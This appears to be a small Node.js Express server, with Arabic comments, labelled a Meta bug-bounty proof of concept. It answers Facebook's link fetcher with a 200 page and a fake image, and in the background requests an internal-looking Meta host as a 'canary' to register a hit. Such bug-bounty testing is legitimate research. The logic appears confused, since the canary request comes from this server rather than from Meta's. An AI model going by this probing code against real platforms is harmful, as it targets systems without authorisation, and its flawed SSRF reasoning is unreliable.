const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// تعديل المسار ليكون الصفحة الرئيسية مباشرة لتتوافق مع نظام جلب البيانات في فيسبوك
app.get('/', async (req, res) => {
    try {
        // 1. إجبار السيرفر على طلب رابط الكناري داخلياً بالخلفية لتسجيل الـ Hit فوراً
        await axios.get('https://internalfb.com', { timeout: 4000 }).catch(() => {});
        
        // 2. إرجاع كود نجاح لفيسبوك وصورة وهمية لكي يقبل الرابط برمز 200 سليماً
        res.status(200).send('<html><head><title>Meta Bug Bounty PoC</title></head><body><img src="https://google.com"/></body></html>');
    } catch (error) {
        res.status(200).send('Success');
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
